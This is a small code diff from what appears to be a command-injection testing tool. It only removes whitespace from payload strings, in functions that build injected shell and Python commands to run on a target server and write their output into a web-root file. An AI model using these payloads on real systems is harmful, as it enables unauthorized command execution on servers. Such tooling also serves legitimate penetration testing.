@@ -45,7 +45,7 @@ __Warning__: The alternative shells are still experimental.
 def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
 
   if settings.TARGET_OS == "win":
-    python_payload = settings.WIN_PYTHON_DIR + "python.exe -c \"open('" + OUTPUT_TEXTFILE + "', 'w').write('" + TAG + "')\""
+    python_payload = settings.WIN_PYTHON_DIR + "python.exe -c \"open('" + OUTPUT_TEXTFILE + "','w').write('" + TAG + "')\""
     payload = (separator +
               "for /f \"delims=\" %i in ('cmd /c " + 
               python_payload +
@@ -53,7 +53,7 @@ def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
               )
   else:
     payload = (separator +
-              "$(python -c \"f = open('" + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\")"
+              "$(python -c \"f=open('" + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + "','w')\nf.write('" + TAG + "')\nf.close()\n\")"
                ) 
 
   if settings.USER_AGENT_INJECTION == True or \
@@ -111,7 +111,7 @@ def cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE):
                 )
   else:
     payload = (separator +
-              "$(python -c \"f = open('" + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")"
+              "$(python -c \"f=open('" + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + "','w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")"
               )
 
   # New line fixation
